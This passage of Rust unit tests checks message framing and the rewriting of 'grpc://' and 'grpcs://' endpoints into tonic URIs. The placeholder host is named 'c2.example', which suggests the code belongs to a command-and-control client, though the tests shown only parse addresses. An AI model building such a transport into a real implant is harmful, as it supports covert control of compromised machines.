        assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 5);
        assert_eq!(&f[4..], b"hello");
    }

    #[test]
    fn grpc_endpoints_rewrite_to_a_tonic_uri() {
        // `grpcs://` must not be mangled by the `grpc://` rewrite, which is
        // why the scheme strings are matched with the `://` included.
        let plain = Transport::from_endpoint("grpc://c2.example:50051").unwrap();
        let Transport::Grpc { endpoint, .. } = &plain else {
            panic!("expected grpc transport");
        };
        assert_eq!(endpoint, "http://c2.example:50051");

        let tls = Transport::from_endpoint("grpcs://c2.example:50051").unwrap();
        let Transport::Grpc { endpoint, .. } = &tls else {
            panic!("expected grpc transport");
        };
        assert_eq!(endpoint, "https://c2.example:50051");
        assert_eq!(plain.describe(), "http://c2.example:50051");
    }
}
